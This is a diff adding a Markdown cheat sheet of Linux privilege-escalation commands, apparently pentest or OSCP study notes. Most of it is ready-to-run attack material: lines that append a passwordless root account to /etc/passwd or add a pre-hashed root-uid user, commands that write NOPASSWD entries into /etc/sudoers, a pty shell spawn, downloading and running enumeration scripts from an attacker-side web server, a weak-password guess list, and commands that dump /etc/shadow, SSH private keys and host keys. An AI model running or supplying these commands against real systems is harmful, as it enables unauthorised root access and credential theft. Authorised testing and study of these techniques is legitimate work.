@@ -1,0 +1,189 @@
+# Commands to run for privilege escalation in Linux
+https://blackwintersecurity.com/
+
+# Now we start the whole enumeration-process over gain.
+	• Kernel exploits
+	• Programs running as root
+	• Installed software
+	• Weak/reused/plaintext passwords
+	• Inside service
+	• Suid misconfiguration
+	• World writable scripts invoked by root
+	• Unmounted filesystems
+# Less likely
+	• Private ssh keys
+	• Bad path configuration
+	• Cronjobs (crontab -l)
+
+# If /etc/passwd is world-writeable then
+
+Just type:
+
+echo root::0:0:root:/root:/bin/bash >> /etc/passwd
+
+su
+
+and you are root.
+
+(Removing x means root requires no password anymore, you can use "sed" command instead of "echo" yet this is enough to get root shell)
+
+OR
+mkpasswd -m SHA-512 sukrit
+
+# We have this created user sukrit with pass sukrit
+
+sukrit:$6$ulD3YFmO2$Vua0cMjsw0Y3/VV.Yj5OIDNy0xZPTOqYqZHQXHe8EI8N9LGfJqESEe5/6hX0FR.129DcHW5H7ifMdHdOeDx1k/:0:0:root:/root:/bin/bash
+
+# When you have a www-data shell and want to execute something as sudo
+
+$ echo 'echo "www-data ALL=NOPASSWD: ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
+
+type sudo su
+
+# To-try list
+
+Here you will add all possible leads. What to try.
+
+# Useful commands
+
+# Can run echo as root?
+
+Then run echo "uname -a" | bash
+
+Then basically run stuff from there.
+
+# ALWAYS LOOK FOR DB_CRED in config files and THEN CHECK FOR PASSWORD RE-USE
+
+# Check superuser privileges
+sudo -l
+
+# Use another user
+sudo -u <username> cat ls -la
+# Spawning shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+# Access to more binaries
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+# Set up webserver
+cd /root/oscp/useful-tools/privesc/linux/privesc-scripts; python -m SimpleHTTPServer 8080
+# Download all files
+wget http://192.168.1.101:8080/ -r; mv 192.168.1.101:8080 exploits; cd exploits; rm index.html; chmod 700 LinEnum.sh linprivchecker.py unix-privesc-check
+./LinEnum.sh -t -k password -r LinEnum.txt
+python linprivchecker.py extended
+./unix-privesc-check standard
+# Writable directories
+/tmp
+/var/tmp
+# Add user to sudoers
+echo "hacker ALL=(ALL:ALL) ALL" >> /etc/sudoers
+Basic info
+	• OS:
+	• Version:
+	• Kernel version:
+	• Architecture:
+	• Current user:
+Devtools:
+	• GCC:
+	• NC:
+	• WGET:
+Users with login:
+uname -a
+env
+id
+cat /proc/version
+cat /etc/issue
+cat /etc/passwd
+cat /etc/group
+cat /etc/shadow
+cat /etc/hosts
+# Users with login
+grep -vE "nologin" /etc/passwd
+# Priv Enumeration Scripts
+upload /unix-privesc-check
+upload /root/Desktop/Backup/Tools/Linux_privesc_tools/linuxprivchecker.py ./
+upload /root/Desktop/Backup/Tools/Linux_privesc_tools/LinEnum.sh ./
+python linprivchecker.py extended
+./LinEnum.sh -t -k password
+unix-privesc-check
+Kernel exploits
+site:exploit-db.com kernel version
+perl /root/oscp/useful-tools/privesc/linux/Linux_Exploit_Suggester/Linux_Exploit_Suggester.pl -k 2.6
+python linprivchecker.py extended
+Programs running as root
+Look for webserver, mysql or anything else like that.
+# Metasploit
+ps
+# Linux
+ps aux
+Installed software
+/usr/local/
+/usr/local/src
+/usr/local/bin
+/opt/
+/home
+/var/
+/usr/src/
+# Debian
+dpkg -l
+# CentOS, OpenSuse, Fedora, RHEL
+rpm -qa (CentOS / openSUSE )
+# OpenBSD, FreeBSD
+pkg_info
+Weak/reused/plaintext passwords
+	• Check database config-file
+	• Check databases
+	• Check weak passwords
+username:username
+username:username1
+username:root
+username:admin
+username:qwerty
+username:password
+	• Check plaintext
+./LinEnum.sh -t -k password
+Inside service
+# Linux
+netstat -anlp
+netstat -ano
+Suid misconfiguration
+Binary with suid permission can be run by anyone, but when they are run they are run as root!
+Example programs:
+nmap
+vim
+nano
+find / -perm -u=s -type f 2>/dev/null
+Unmounted filesystems
+Here we are looking for any unmounted filesystems. If we find one we mount it and start the priv-esc process over again.
+mount -l
+Cronjob
+Look for anything that is owned by privileged user but writable for you
+crontab -l
+ls -alh /var/spool/cron
+ls -al /etc/ | grep cron
+ls -al /etc/cron*
+cat /etc/cron*
+cat /etc/at.allow
+cat /etc/at.deny
+cat /etc/cron.allow
+cat /etc/cron.deny
+cat /etc/crontab
+cat /etc/anacrontab
+cat /var/spool/cron/crontabs/root
+SSH Keys
+Check all home directories
+cat ~/.ssh/authorized_keys
+cat ~/.ssh/identity.pub
+cat ~/.ssh/identity
+cat ~/.ssh/id_rsa.pub
+cat ~/.ssh/id_rsa
+cat ~/.ssh/id_dsa.pub
+cat ~/.ssh/id_dsa
+cat /etc/ssh/ssh_config
+cat /etc/ssh/sshd_config
+cat /etc/ssh/ssh_host_dsa_key.pub
+cat /etc/ssh/ssh_host_dsa_key
+cat /etc/ssh/ssh_host_rsa_key.pub
+cat /etc/ssh/ssh_host_rsa_key
+cat /etc/ssh/ssh_host_key.pub
+cat /etc/ssh/ssh_host_key
+Bad path configuration
+Require user interaction
